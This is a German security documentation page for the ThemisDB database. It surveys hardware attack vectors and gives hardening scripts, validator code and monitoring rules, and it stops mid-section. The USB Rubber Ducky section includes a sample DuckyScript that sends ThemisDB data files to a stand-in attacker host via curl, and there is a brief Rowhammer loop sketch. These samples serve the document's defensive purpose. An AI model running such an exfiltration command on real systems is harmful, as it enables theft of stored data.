# Hardware-Angriffsvektoren – Übersicht und Schutzmaßnahmen

**Stand:** 6. April 2026  
**Version:** 1.0.0  
**Kategorie:** 🔒 Security

---

## 📑 Inhaltsverzeichnis

- [Einleitung](#einleitung)
- [USB-Angriffsvektoren](#usb-angriffsvektoren)
- [PCIe- und DMA-Angriffe](#pcie--und-dma-angriffe)
- [CPU-Angriffe](#cpu-angriffe)
- [RAM-Angriffe](#ram-angriffe)
- [Weitere I/O-Angriffsvektoren](#weitere-io-angriffsvektoren)
- [Firmware- und BIOS/UEFI-Angriffe](#firmware--und-biosuefi-angriffe)
- [Gegenmaßnahmen und Best Practices](#gegenmaßnahmen-und-best-practices)
- [ThemisDB-spezifische Härtungsmaßnahmen](#themisdb-spezifische-härtungsmaßnahmen)
- [Monitoring und Erkennung](#monitoring-und-erkennung)
- [Compliance und Standards](#compliance-und-standards)
- [Siehe auch](#siehe-auch)

---

## Einleitung

Hardware-Angriffsvektoren stellen eine besondere Bedrohung für Datenbanksysteme dar, da sie oft unterhalb der Betriebssystemebene operieren und traditionelle Software-Sicherheitsmaßnahmen umgehen können. Für ThemisDB, das sensible Daten verarbeitet und speichert, ist ein tiefes Verständnis dieser Angriffsvektoren und entsprechender Schutzmaßnahmen essentiell.

Dieses Dokument bietet eine umfassende Übersicht über Hardware-Angriffsvektoren auf Serverebene und zeigt spezifische Schutzmaßnahmen für ThemisDB-Deployments auf.

> **Hinweis:** Diese Dokumentation konzentriert sich primär auf Linux-basierte Deployments, die für produktive ThemisDB-Server empfohlen werden. Windows-spezifische Hinweise sind dort enthalten, wo zutreffend, jedoch bleibt Linux die bevorzugte Plattform für sicherheitsgehärtete Datenbank-Deployments.

### Gefährdungsklassifizierung

| Bedrohungskategorie | Wahrscheinlichkeit | Impact | Risiko |
|---------------------|-------------------|--------|--------|
| USB-Angriffe | Mittel-Hoch | Hoch | ⚠️ Hoch |
| PCIe/DMA-Angriffe | Mittel | Kritisch | 🔴 Kritisch |
| CPU-Angriffe | Hoch | Mittel-Hoch | ⚠️ Hoch |
| RAM-Angriffe | Niedrig-Mittel | Kritisch | ⚠️ Hoch |
| Firmware-Angriffe | Niedrig | Kritisch | 🟡 Mittel |

---

## USB-Angriffsvektoren

### Übersicht

USB-Ports stellen einen der häufigsten physischen Angriffsvektoren dar, da sie in fast allen Systemen vorhanden und leicht zugänglich sind.

### Angriffsarten

#### 1. **BadUSB / Malicious HID**

**Beschreibung:** USB-Geräte (z.B. manipulierte Tastaturen, Speichersticks) mit umprogrammierter Firmware, die sich als Eingabegeräte ausgeben und automatisch Befehle ausführen.

**Angriffsszenario:**
```
1. Angreifer platziert manipulierten USB-Stick im Rechenzentrum
2. Administrator steckt Gerät ein (Social Engineering)
3. Gerät emuliert Tastatur und führt Befehle aus:
   - Download und Ausführung von Malware
   - Exfiltration von Credentials
   - Backdoor-Installation
```

**Bedrohung für ThemisDB:**
- Direkter Zugriff auf Server-Shell
- Extraktion von Konfigurationsdateien (`config.yaml`)
- Zugriff auf Secrets/Keys
- Manipulation von RocksDB-Daten

**Schweregrad:** 🔴 **KRITISCH**

#### 2. **USB Rubber Ducky**

Spezialisiertes BadUSB-Gerät mit vorprogrammierten Angriffsskripten (DuckyScript).

**Beispielangriff auf ThemisDB:**
```duckyscript
REM ThemisDB Data Exfiltration
DELAY 1000
GUI r
DELAY 500
STRING cmd
ENTER
DELAY 500
STRING curl http://attacker.com/exfil -d @/var/lib/themisdb/data/*
ENTER
```

**Schweregrad:** 🔴 **KRITISCH**

#### 3. **USB-Killers**

Hardware-Geräte, die elektrische Überspannungen erzeugen und Systeme physisch zerstören.

**Bedrohung:** Denial-of-Service, Hardware-Zerstörung  
**Schweregrad:** 🟡 **MITTEL** (primär physischer Schaden, keine Datenexfiltration)

#### 4. **USB-Keylogger**

Hardware-Keylogger zwischen Tastatur und USB-Port zur Aufzeichnung aller Eingaben.

**Bedrohung:** Passwörter, Admin-Befehle, Verschlüsselungsschlüssel  
**Schweregrad:** 🔴 **KRITISCH**

### Schutzmaßnahmen

#### Präventive Maßnahmen

1. **USB-Port-Deaktivierung**
   ```bash
   # Linux: Blacklist USB-Storage
   echo "blacklist usb-storage" >> /etc/modprobe.d/blacklist.conf
   echo "install usb-storage /bin/true" >> /etc/modprobe.d/blacklist.conf
   update-initramfs -u
   ```

2. **USBGuard – Fine-grained USB Device Control**
   ```bash
   # Installation
   apt-get install usbguard
   
   # Whitelist nur bekannte Geräte
   usbguard generate-policy > /etc/usbguard/rules.conf
   systemctl enable --now usbguard
   ```

3. **BIOS/UEFI-Level USB-Blocking**
   - USB-Ports im BIOS deaktivieren
   - BIOS-Passwortschutz aktivieren
   - Secure Boot aktivieren

4. **Physische Sicherung**
   - USB-Port-Blocker (physische Abdeckungen)
   - Rechenzentrum mit Zugangskontrollen
   - Video-Überwachung

#### Detektive Maßnahmen

```bash
# USB-Device-Monitoring mit auditd
auditctl -w /dev/bus/usb -p wa -k usb_events
auditctl -w /sys/bus/usb/devices/ -p wa -k usb_device_changes
```

---

## PCIe- und DMA-Angriffe

### Übersicht

PCIe (Peripheral Component Interconnect Express) ermöglicht Direct Memory Access (DMA), wodurch Geräte direkt auf den Systemspeicher zugreifen können – ein mächtiger Angriffsvektor.

### Angriffsarten

#### 1. **DMA-Angriffe (Direct Memory Access)**

**Beschreibung:** PCIe-Geräte können DMA nutzen, um direkt auf RAM zuzugreifen und dabei Betriebssystem-Kontrollen zu umgehen.

**Angriffsszenario:**
```
1. Angreifer installiert manipulierte PCIe-Karte (z.B. Netzwerkkarte)
2. Karte nutzt DMA, um gesamten RAM auszulesen
3. Extraktion von:
   - Verschlüsselungsschlüsseln aus dem Speicher
   - ThemisDB-Daten (unverschlüsselt im RAM)
   - Admin-Credentials
```

**Tools:** PCILeech, Inception

**Bedrohung für ThemisDB:**
- Direkter Zugriff auf RocksDB-Cache
- Extraktion von DEK/KEK aus dem Speicher
- Bypass aller Software-Sicherheitsmaßnahmen

**Schweregrad:** 🔴 **KRITISCH**

#### 2. **PCIe Option ROM Attacks**

PCIe-Geräte haben eigene Firmware (Option ROMs), die während des Bootvorgangs ausgeführt wird – vor dem Betriebssystem.

**Bedrohung:** Bootkits, Rootkits, persistente Backdoors  
**Schweregrad:** 🔴 **KRITISCH**

#### 3. **Thunderbolt/USB4 DMA-Angriffe**

Thunderbolt/USB4 unterstützt PCIe-Tunneling und ermöglicht damit externe DMA-Zugriffe.

**Angriffsszenario:**
```
1. Angreifer verbindet Thunderbolt-Gerät
2. Gerät nutzt PCIe-over-Thunderbolt für DMA
3. "Thunderspy" / "Thunderclap" Exploits
```

**Schweregrad:** 🔴 **KRITISCH**

### Schutzmaßnahmen

#### 1. **IOMMU (Input-Output Memory Management Unit)**

IOMMU isoliert DMA-Zugriffe und verhindert, dass Geräte beliebig auf RAM zugreifen können.

**Aktivierung (Intel VT-d):**
```bash
# GRUB-Konfiguration
vi /etc/default/grub
# Hinzufügen:
GRUB_CMDLINE_LINUX="intel_iommu=on iommu=pt"

# Update GRUB
update-grub
reboot
```

**Aktivierung (AMD-Vi):**
```bash
GRUB_CMDLINE_LINUX="amd_iommu=on iommu=pt"
```

**Verifikation:**
```bash
dmesg | grep -i iommu
# Sollte zeigen: "IOMMU enabled"
```

#### 2. **Kernel DMA Protection (Windows 10+)**

Windows 10 (1803+) bietet Kernel DMA Protection für Thunderbolt 3 Geräte.

**Überprüfung:**
```powershell
Get-WmiObject -Class Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard
# Property: DmaProtectionStatus (1 = enabled)
```

#### 3. **Thunderbolt Security Levels**

```bash
# Linux: Thunderbolt Security Level setzen
echo "user" > /sys/bus/thunderbolt/devices/0-0/security
# Levels: none (unsicher), user, secure, dponly
```

#### 4. **PCIe-Access-Control-Services (ACS)**

ACS verhindert Peer-to-Peer-DMA zwischen PCIe-Geräten.

```bash
# Überprüfung
lspci -vv | grep -i "access control"
```

#### 5. **Physical Security**

- PCIe-Slots mit Epoxidharz verschließen (permanente Lösung)
- Gehäuse-Intrusion-Detection aktivieren
- Serverracks abschließen

---

## CPU-Angriffe

### Übersicht

Moderne CPUs sind anfällig für verschiedene Seitenkanalangriffe, die durch Mikroarchitektur-Features wie spekulative Ausführung entstehen.

### Angriffsarten

#### 1. **Spectre (CVE-2017-5753, CVE-2017-5715)**

**Beschreibung:** Ausnutzung spekulativer Ausführung, um über Grenzen zu lesen und Daten aus anderen Prozessen zu extrahieren.

**Angriffsprinzip:**
```
1. Branch-Prediction trainieren (Speculative Execution)
2. Spekulativen Zugriff auf sensitive Daten auslösen
3. Daten über Cache-Timing-Seitenkanalattacke auslesen
```

**Bedrohung für ThemisDB:**
- Leakage von Verschlüsselungsschlüsseln
- Zugriff auf Daten anderer Benutzer/Sessions
- Cross-VM-Angriffe in Cloud-Umgebungen

**Schweregrad:** ⚠️ **HOCH**

#### 2. **Meltdown (CVE-2017-5754)**

**Beschreibung:** Lesen von Kernel-Speicher aus User-Space durch Ausnutzung von Out-of-Order-Execution.

**Bedrohung:** Kernel-Passwörter, Schlüssel, Datenbank-Cache  
**Schweregrad:** ⚠️ **HOCH**

#### 3. **MDS (Microarchitectural Data Sampling)**

- **RIDL** (Rogue In-Flight Data Load)
- **Fallout** (Store Buffer Data Sampling)
- **ZombieLoad**

**Beschreibung:** Sampling von Daten aus CPU-internen Puffern (Load/Store Buffers, Fill Buffers).

**Schweregrad:** ⚠️ **HOCH**

#### 4. **Intel SGX-Angriffe**

- **Plundervolt**: Voltage-Manipulation zur SGX-Fence-Umgehung
- **SGAxe**: Cache-Angriff auf SGX Enclaves

**Schweregrad:** 🟡 **MITTEL** (nur relevant bei SGX-Nutzung)

#### 5. **Weitere CPU-Schwachstellen**

- **Foreshadow/L1TF** (L1 Terminal Fault)
- **Branch Target Injection (BTI)**
- **Retbleed** (Return-to-Kernel-Exploit)

### Schutzmaßnahmen

#### 1. **Microcode-Updates**

```bash
# Intel
apt-get install intel-microcode

# AMD
apt-get install amd64-microcode

# Verifikation
dmesg | grep microcode
```

#### 2. **Kernel-Mitigations aktivieren**

```bash
# /etc/default/grub
GRUB_CMDLINE_LINUX="spectre_v2=on spec_store_bypass_disable=on l1tf=full,force mds=full,nosmt"

update-grub
reboot
```

**Parameter-Erklärung:**
- `spectre_v2=on`: Retpoline-Schutz
- `spec_store_bypass_disable=on`: SSBD (Speculative Store Bypass Disable)
- `l1tf=full,force`: L1TF-Mitigations
- `mds=full,nosmt`: MDS-Mitigations (deaktiviert SMT/Hyper-Threading)

#### 3. **SMT/Hyper-Threading deaktivieren**

```bash
# Runtime
echo off > /sys/devices/system/cpu/smt/control

# Permanent (BIOS)
# Deaktiviere Hyper-Threading im BIOS/UEFI
```

**Trade-off:** Performance-Verlust (20-30%), aber erhöhte Sicherheit

#### 4. **Kernel Page-Table Isolation (KPTI)**

Automatisch aktiviert für Meltdown-Schutz (seit Kernel 4.14+).

```bash
# Verifikation
cat /sys/devices/system/cpu/vulnerabilities/*
```

#### 5. **Software-Side-Channel-Hardening**

**Für ThemisDB-Code:**
```cpp
// Constant-time comparison für Kryptografie
bool secure_compare(const std::string& a, const std::string& b) {
    if (a.size() != b.size()) return false;
    
    volatile unsigned char result = 0;
    for (size_t i = 0; i < a.size(); i++) {
        result |= a[i] ^ b[i];
    }
    return result == 0;
}
```

---

## RAM-Angriffe

### Übersicht

RAM enthält unverschlüsselte Daten und Schlüssel während der Laufzeit und ist damit ein attraktives Angriffsziel.

### Angriffsarten

#### 1. **Cold Boot Attack**

**Beschreibung:** Remanenz von DRAM – Speicher behält Daten für Sekunden bis Minuten nach Stromausfall.

**Angriffsszenario:**
```
1. System einfrieren (Spray mit verflüssigtem Gas)
2. RAM-Module ausbauen
3. In Analyse-System einsetzen
4. RAM-Dump erstellen
5. Verschlüsselungsschlüssel extrahieren
```

**Tools:** Inception, BootIce

**Bedrohung für ThemisDB:**
- DEK/KEK-Extraktion aus RAM
- RocksDB-Cache-Dump
- Session-Tokens

**Schweregrad:** 🟡 **MITTEL** (erfordert physischen Zugriff)

#### 2. **Rowhammer**

**Beschreibung:** Bit-Flips in DRAM durch wiederholtes Lesen benachbarter Speicherzeilen.

**Angriffsszenario:**
```cpp
// Pseudo-Code
while(true) {
    *addr1 = value;  // Row hammer
    *addr2 = value;
    clflush(addr1);
    clflush(addr2);
}
// Führt zu Bit-Flips in benachbarten Zeilen
```

**Bedrohung:** Privilege Escalation, Code-Injection  
**Schweregrad:** 🟡 **MITTEL**

**Varianten:**
- **RAMBleed**: Daten-Leakage via Rowhammer
- **TRRespass**: Neue Rowhammer-Angriffe (2020+)
- **SMASH**: Synchronous DRAM Refresh

#### 3. **DMA-basierte RAM-Angriffe**

Siehe [PCIe- und DMA-Angriffe](#pcie--und-dma-angriffe)

#### 4. **RAM-Trojaner / Malicious DIMMs**

Supply-Chain-Angriff: Manipulierte RAM-Module mit integrierter Backdoor.

**Schweregrad:** 🔴 **KRITISCH** (schwer zu erkennen)

### Schutzmaßnahmen

#### 1. **Memory Encryption (AMD SME/SEV, Intel TME)**

**AMD Secure Memory Encryption (SME):**
```bash
# GRUB-Konfiguration
GRUB_CMDLINE_LINUX="mem_encrypt=on"

# Verifikation
dmesg | grep -i SME
```

**Intel Total Memory Encryption (TME):**
- Verfügbar ab Intel Ice Lake Server CPUs
- Automatisch aktiviert (keine Konfiguration)

**Intel Multi-Key Total Memory Encryption (MKTME):**
- Mehrere Verschlüsselungsschlüssel für verschiedene VMs

#### 2. **ECC Memory (Error Correcting Code)**

Schützt vor Bit-Flips (Rowhammer).

```bash
# ECC-Status prüfen
dmidecode -t memory | grep -i ecc
```

**Empfehlung:** Immer ECC-RAM für Produktionssysteme verwenden

#### 3. **Memory Scrubbing**

Periodisches Überschreiben von RAM-Bereichen.

```bash
# Linux Kernel Memory Scrubbing (automatisch mit ECC)
cat /sys/devices/system/edac/mc/mc0/ce_count
```

#### 4. **Full Memory Encryption (FDE für RAM)**

**Für ThemisDB (Application-Level):**
```cpp
// Memory-Locking für sensitive Daten
void lockMemory(void* addr, size_t len) {
    mlock(addr, len);  // Verhindert Swapping
    sodium_mlock(addr, len);  // Libsodium Memory Protection
}

void secureWipe(void* addr, size_t len) {
    sodium_memzero(addr, len);  // Sicheres Löschen
}
```

#### 5. **Anti-Cold-Boot-Maßnahmen**

- **Encrypted Swap/Hibernate:** Keine Klartext-Daten auf Festplatte
- **RAM-Wipe beim Herunterfahren:**
  ```bash
  # Systemd-Service für RAM-Wipe
  [Service]
  ExecStop=/usr/local/bin/wipe_memory.sh
  ```

#### 6. **Target Row Refresh (TRR) gegen Rowhammer**

- Moderne DDR4/DDR5 mit TRR-Support verwenden
- BIOS-Update für verbesserte Rowhammer-Mitigations

---

## Weitere I/O-Angriffsvektoren

### 1. **Thunderbolt/Firewire DMA**

**Beschreibung:** Thunderbolt und Firewire ermöglichen DMA über externe Ports.

**Schweregrad:** 🔴 **KRITISCH**

**Schutzmaßnahmen:**
- Thunderbolt-Security-Levels (siehe [PCIe-Angriffe](#pcie--und-dma-angriffe))
- Firewire-Treiber deaktivieren:
  ```bash
  echo "blacklist firewire-core" >> /etc/modprobe.d/blacklist.conf
  echo "blacklist firewire-ohci" >> /etc/modprobe.d/blacklist.conf
  ```

### 2. **IPMI/BMC (Baseboard Management Controller)**

**Beschreibung:** Out-of-Band-Management-Interface mit direktem Hardware-Zugriff.

**Angriffsvektoren:**
- Default-Credentials (häufig: `ADMIN/ADMIN`)
- Bekannte Vulnerabilities (z.B. "IPMI 2.0 RAKP Authentication Bypass")
- Direkter RAM-Zugriff über IPMI-Interface

**Schweregrad:** 🔴 **KRITISCH**

**Schutzmaßnahmen:**
```bash
# Sichere IPMI-Konfiguration
ipmitool user set password 2 "<strong-password>"
ipmitool lan set 1 access off  # Netzwerkzugriff deaktivieren

# IPMI nur über dediziertes Management-VLAN
# Firewall-Regel: Nur Admin-IPs erlauben
iptables -A INPUT -p udp --dport 623 -s <admin-ip> -j ACCEPT
iptables -A INPUT -p udp --dport 623 -j DROP
```

### 3. **Serial/UART-Zugriff**

**Beschreibung:** Serielle Konsolen bieten oft ungefilterten Boot-Zugriff.

**Schutzmaßnahmen:**
- Serial Console deaktivieren (GRUB):
  ```bash
  # GRUB_CMDLINE_LINUX enthält NICHT: console=ttyS0
  ```
- Physische Sicherung: Kein externer Serial-Port

### 4. **JTAG/Debug-Ports**

**Beschreibung:** Hardware-Debug-Interfaces für Entwicklung.

**Bedrohung:** Direkter Memory-Dump, Code-Injection  
**Schweregrad:** 🔴 **KRITISCH**

**Schutzmaßnahmen:**
- JTAG-Fuses brennen (permanent)
- Debug-Ports physisch unzugänglich machen
- Secure Boot mit Debug-Disable

### 5. **SATA/NVMe Drive-Firmware-Angriffe**

**Beschreibung:** Manipulierte Firmware in SSDs/HDDs.

**Beispiel:** "BadUSB for HDDs" – Festplatte emuliert USB-HID

**Schutzmaßnahmen:**
- Self-Encrypting Drives (SEDs) mit Secure Erase
- Regelmäßige Firmware-Updates
- Supply-Chain-Security (vertrauenswürdige Lieferanten)

---

## Firmware- und BIOS/UEFI-Angriffe

### Übersicht

Firmware-Angriffe operieren unterhalb des Betriebssystems und sind schwer zu erkennen.

### Angriffsarten

#### 1. **UEFI Bootkits / BIOS Rootkits**

**Beschreibung:** Malware in UEFI/BIOS-Firmware persistiert auch nach OS-Neuinstallation.

**Beispiele:**
- LoJax (2018): Erster UEFI-Rootkit in freier Wildbahn
- MosaicRegressor (2020): UEFI-Rootkit mit TTP-Ähnlichkeit zu chinesischen APT-Gruppen

**Schweregrad:** 🔴 **KRITISCH**

#### 2. **Intel ME / AMD PSP Exploits**

- **Intel Management Engine (ME):** Subsystem mit vollem Hardware-Zugriff
- **AMD Platform Security Processor (PSP):** AMD-Äquivalent

**Bekannte Vulnerabilities:**
- CVE-2017-5689: Intel ME Remote Exploit
- CVE-2018-3639: AMD PSP Exploit

**Schweregrad:** 🔴 **KRITISCH**

#### 3. **Option ROM Rootkits**

PCIe-Geräte (Netzwerkkarten, GPUs) mit manipulierter Firmware.

**Schweregrad:** 🔴 **KRITISCH**

### Schutzmaßnahmen

#### 1. **Secure Boot**

```bash
# Secure Boot Status prüfen
mokutil --sb-state

# Sollte sein: SecureBoot enabled
```

#### 2. **UEFI Firmware Updates**

```bash
# fwupd für automatische Firmware-Updates
apt-get install fwupd
fwupdmgr refresh
fwupdmgr update
```

#### 3. **BIOS/UEFI Write-Protection**

- BIOS-Passwort setzen
- SPI-Flash-Chip Write-Protect aktivieren (Hardware-Jumper)

#### 4. **Intel ME/AMD PSP Deaktivierung (Advanced)**

**Intel ME Disable (me_cleaner):**
```bash
# Warnung: Kann zu Instabilität führen
# https://github.com/corna/me_cleaner
python me_cleaner.py -s -O modified_bios.bin original_bios.bin
```

**AMD PSP Disable:**
- Nur über BIOS-Modding (riskant)

#### 5. **TPM (Trusted Platform Module) Measured Boot**

```bash
# TPM 2.0 prüfen
cat /sys/class/tpm/tpm0/tpm_version_major

# Boot-Attestation
tpm2_quote --pcr-list sha256:0,1,2,3,4,5,6,7
```

#### 6. **Firmware-Integrity-Monitoring**

```bash
# CHIPSEC – Intel Security Testing Framework
git clone https://github.com/chipsec/chipsec.git
cd chipsec
python setup.py install

# Sicherheitsprüfungen
chipsec_main -m common.bios_wp
chipsec_main -m common.smm
```

---

## Gegenmaßnahmen und Best Practices

### Defense-in-Depth Strategie

```
┌─────────────────────────────────────────┐
│  Ebene 7: Monitoring & Incident Response│  ← Logging, SIEM
├─────────────────────────────────────────┤
│  Ebene 6: Firmware-Sicherheit           │  ← Secure Boot, TPM
├─────────────────────────────────────────┤
│  Ebene 5: CPU-Mitigations               │  ← Microcode, KPTI
├─────────────────────────────────────────┤
│  Ebene 4: Memory Protection             │  ← IOMMU, SME/TME
├─────────────────────────────────────────┤
│  Ebene 3: I/O-Zugriffskontrolle         │  ← USBGuard, ACS
├─────────────────────────────────────────┤
│  Ebene 2: Physische Sicherheit          │  ← Locked Racks, Cameras
├─────────────────────────────────────────┤
│  Ebene 1: Trusted Hardware              │  ← ECC RAM, Secure Supply Chain
└─────────────────────────────────────────┘
```

### Allgemeine Härtungsmaßnahmen

#### 1. **Hardware-Härtung**

- [ ] ECC-RAM verwenden (obligatorisch für Produktion)
- [ ] CPUs mit aktuellen Microcode-Updates
- [ ] Trusted Platform Module (TPM 2.0)
- [ ] Self-Encrypting Drives (SEDs)
- [ ] Vertrauenswürdige Supply Chain

#### 2. **BIOS/UEFI-Härtung**

- [ ] Secure Boot aktivieren
- [ ] BIOS-Passwort setzen (Admin + User)
- [ ] USB-Boot deaktivieren
- [ ] PXE-Boot deaktivieren (außer bei Diskless-Deployments)
- [ ] Intel VT-d / AMD-Vi (IOMMU) aktivieren
- [ ] Hyper-Threading deaktivieren (für High-Security-Umgebungen)
- [ ] Legacy-BIOS-Modus deaktivieren (nur UEFI)

#### 3. **Betriebssystem-Härtung**

```bash
#!/bin/bash
# ThemisDB Hardware Security Hardening Script

# 1. USB-Speicher deaktivieren
echo "blacklist usb-storage" >> /etc/modprobe.d/blacklist-usb.conf
echo "install usb-storage /bin/true" >> /etc/modprobe.d/blacklist-usb.conf

# 2. Firewire deaktivieren
echo "blacklist firewire-core" >> /etc/modprobe.d/blacklist-firewire.conf
echo "blacklist firewire-ohci" >> /etc/modprobe.d/blacklist-firewire.conf

# 3. Thunderbolt Security
echo "user" > /sys/bus/thunderbolt/devices/0-0/security 2>/dev/null || true

# 4. IOMMU aktivieren
if ! grep -q "intel_iommu=on" /etc/default/grub; then
    sed -i 's/GRUB_CMDLINE_LINUX="/GRUB_CMDLINE_LINUX="intel_iommu=on iommu=pt /' /etc/default/grub
    update-grub
fi

# 5. CPU-Mitigations
if ! grep -q "spectre_v2=on" /etc/default/grub; then
    sed -i 's/GRUB_CMDLINE_LINUX="/GRUB_CMDLINE_LINUX="spectre_v2=on spec_store_bypass_disable=on l1tf=full,force mds=full /' /etc/default/grub
    update-grub
fi

# 6. Kernel-Parameter für Memory-Security
sysctl -w kernel.yama.ptrace_scope=3
sysctl -w kernel.kptr_restrict=2
sysctl -w kernel.dmesg_restrict=1

# Persistent
cat >> /etc/sysctl.d/99-hardware-security.conf <<EOF
kernel.yama.ptrace_scope=3
kernel.kptr_restrict=2
kernel.dmesg_restrict=1
EOF

# 7. Swap deaktivieren (für In-Memory-Datenbanken)
swapoff -a
sed -i '/swap/d' /etc/fstab

echo "Hardware-Härtung abgeschlossen. Reboot erforderlich."
```

#### 4. **Physische Sicherheit**

- [ ] Serverracks abgeschlossen
- [ ] Zugangskontrollen (Badge-System)
- [ ] Video-Überwachung
- [ ] Intrusion-Detection (Gehäuse-Öffnungssensoren)
- [ ] Keine nicht-überwachten USB/PCIe-Ports
- [ ] Clean-Desk-Policy für Admin-Arbeitsplätze

---

## ThemisDB-spezifische Härtungsmaßnahmen

### 1. **Memory Protection für Verschlüsselungsschlüssel**

```cpp
// include/security/memory_protection.h
#pragma once

#include <sodium.h>
#include <sys/mman.h>

namespace themis {
namespace security {

class SecureMemory {
public:
    // Allokiert geschützten Speicher
    static void* allocateSecure(size_t size) {
        void* ptr = sodium_malloc(size);
        if (ptr) {
            sodium_mlock(ptr, size);  // Lock in RAM, prevent swapping
        }
        return ptr;
    }
    
    // Sicheres Freigeben
    static void freeSecure(void* ptr, size_t size) {
        if (ptr) {
            sodium_munlock(ptr, size);
            sodium_free(ptr);
        }
    }
    
    // Sicheres Überschreiben
    static void secureWipe(void* ptr, size_t size) {
        sodium_memzero(ptr, size);
    }
};

} // namespace security
} // namespace themis
```

### 2. **Hardware-Security-Modul (HSM) Integration**

Siehe: [security_hsm.md](security_hsm.md)

**Empfohlene HSMs für ThemisDB:**
- **Thales Luna Network HSM**
- **Utimaco SecurityServer**
- **AWS CloudHSM** (für Cloud-Deployments)

### 3. **Konfiguration: Hardware-Security**

```yaml
# config/config.yaml
security:
  hardware:
    # Memory Protection
    secure_memory_wiping: true
    disable_swap: true
    lock_sensitive_memory: true
    
    # DMA Protection
    require_iommu: true
    verify_iommu_on_startup: true
    
    # CPU Security
    verify_microcode_version: true
    minimum_microcode_version:
      intel: "0x2006906"
      amd: "0x8701021"
    
    # Intrusion Detection
    enable_tampering_detection: true
    check_uefi_secure_boot: true
    
    # TPM Integration
    tpm_enabled: true
    tpm_pcr_validation:
      - 0  # BIOS
      - 1  # BIOS Configuration
      - 7  # Secure Boot

    # Physical Security Logging
    log_hardware_changes: true
    alert_on_chassis_intrusion: true
```

### 4. **Startup-Validierung**

```cpp
// src/server/hardware_security_validator.cpp
#include <fstream>
#include <spdlog/spdlog.h>

namespace themis {
namespace security {

class HardwareSecurityValidator {
public:
    static bool validateSecurityPosture() {
        bool allPassed = true;
        
        // 1. IOMMU-Prüfung
        if (!checkIOMMU()) {
            spdlog::error("[SECURITY] IOMMU not enabled - DMA attacks possible!");
            allPassed = false;
        }
        
        // 2. Secure Boot
        if (!checkSecureBoot()) {
            spdlog::warn("[SECURITY] Secure Boot not enabled");
        }
        
        // 3. CPU-Vulnerabilities
        if (!checkCPUVulnerabilities()) {
            spdlog::error("[SECURITY] Unpatched CPU vulnerabilities detected!");
            allPassed = false;
        }
        
        // 4. Memory Encryption
        if (!checkMemoryEncryption()) {
            spdlog::warn("[SECURITY] Memory encryption (SME/TME) not active");
        }
        
        return allPassed;
    }

private:
    static bool checkIOMMU() {
        std::ifstream dmesg("/var/log/dmesg");
        std::string line;
        while (std::getline(dmesg, line)) {
            if (line.find("IOMMU enabled") != std::string::npos) {
                spdlog::info("[SECURITY] IOMMU enabled ✓");
                return true;
            }
        }
        return false;
    }
    
    static bool checkSecureBoot() {
        std::ifstream sb("/sys/firmware/efi/efivars/SecureBoot-*");
        if (sb.good()) {
            spdlog::info("[SECURITY] Secure Boot enabled ✓");
            return true;
        }
        return false;
    }
    
    static bool checkCPUVulnerabilities() {
        // Prüfe /sys/devices/system/cpu/vulnerabilities/*
        std::vector<std::string> vulns = {
            "meltdown", "spectre_v1", "spectre_v2", "mds"
        };
        
        bool allMitigated = true;
        for (const auto& vuln : vulns) {
            std::string path = "/sys/devices/system/cpu/vulnerabilities/" + vuln;
            std::ifstream f(path);
            std::string status;
            std::getline(f, status);
            
            if (status.find("Vulnerable") != std::string::npos) {
                spdlog::error("[SECURITY] CPU vulnerable to {}: {}", vuln, status);
                allMitigated = false;
            } else {
                spdlog::info("[SECURITY] {} mitigation: {}", vuln, status);
            }
        }
        return allMitigated;
    }
    
    static bool checkMemoryEncryption() {
        std::ifstream dmesg("/var/log/dmesg");
        std::string line;
        while (std::getline(dmesg, line)) {
            if (line.find("AMD Memory Encryption") != std::string::npos ||
                line.find("Intel TME") != std::string::npos) {
                spdlog::info("[SECURITY] Memory encryption active ✓");
                return true;
            }
        }
        return false;
    }
};

} // namespace security
} // namespace themis
```

### 5. **Hardware-Event-Monitoring**

```yaml
# config/hardware_alerts.yaml
alerts:
  - name: "USB Device Connected"
    condition: "udev USB insert event"
    severity: HIGH
    action: "Log + Alert"
    
  - name: "PCIe Device Added"
    condition: "lspci device list changed"
    severity: CRITICAL
    action: "Log + Alert + Notify Admin"
    
  - name: "Chassis Intrusion"
    condition: "IPMI chassis status changed"
    severity: CRITICAL
    action: "Log + Alert + Trigger Lockdown"
    
  - name: "Memory Error"
    condition: "EDAC correctable/uncorrectable error"
    severity: MEDIUM
    action: "Log + Monitor Trend"
    
  - name: "CPU Thermal Throttling"
    condition: "CPU temperature > 80°C"
    severity: MEDIUM
    action: "Log + Check Cooling"
```

### 6. **Cold Boot Protection**

**Systemd Service:**
```ini
# /etc/systemd/system/themisdb-shutdown-wipe.service
[Unit]
Description=ThemisDB Memory Wipe on Shutdown
DefaultDependencies=no
Before=shutdown.target

[Service]
Type=oneshot
ExecStart=/usr/local/bin/themisdb_memory_wipe.sh
RemainAfterExit=yes

[Install]
WantedBy=shutdown.target
```

**Wipe-Script:**
```bash
#!/bin/bash
# /usr/local/bin/themisdb_memory_wipe.sh
echo "Wiping sensitive memory..."

# 1. Signal ThemisDB für graceful shutdown
systemctl stop themisdb

# 2. Sync und Drop-Caches
sync
echo 3 > /proc/sys/vm/drop_caches

# 3. Memory Wipe (nur wenn sdmem installiert)
if command -v sdmem &> /dev/null; then
    sdmem -v
fi

echo "Memory wipe complete"
```

---

## Monitoring und Erkennung

### 1. **Hardware-Change-Detection**

```bash
# Cron-Job für Hardware-Inventory
#!/bin/bash
# /etc/cron.hourly/hardware-inventory

CURRENT_HW=$(lshw -short -quiet | sha256sum)
BASELINE_HW=$(cat /var/lib/themisdb/hw_baseline.sha256)

if [ "$CURRENT_HW" != "$BASELINE_HW" ]; then
    logger -t themisdb-security "ALERT: Hardware configuration changed!"
    echo "$CURRENT_HW" > /var/lib/themisdb/hw_baseline.sha256.new
    # Trigger alert
    curl -X POST http://localhost:8765/api/v1/alerts \
        -H "Content-Type: application/json" \
        -d '{"type":"HARDWARE_CHANGE","severity":"HIGH"}'
fi
```

### 2. **USB-Event-Monitoring**

```bash
# auditd-Regel
-w /dev/bus/usb -p wa -k usb_events
-w /sys/bus/usb/devices/ -p wa -k usb_device_changes

# Log-Analyse
ausearch -k usb_events -ts recent
```

### 3. **DMA-Attack-Detection**

```bash
# Monitor für verdächtige PCIe-Aktivitäten
#!/bin/bash
while true; do
    # Prüfe aktive PCIe-Geräte
    lspci > /tmp/pci_current.txt
    
    if ! diff -q /var/lib/themisdb/pci_baseline.txt /tmp/pci_current.txt; then
        logger -t themisdb-security "ALERT: PCIe device change detected!"
        # Alert senden
    fi
    
    sleep 60
done
```

### 4. **Memory-Error-Monitoring**

```bash
# EDAC (Error Detection and Correction) Monitoring
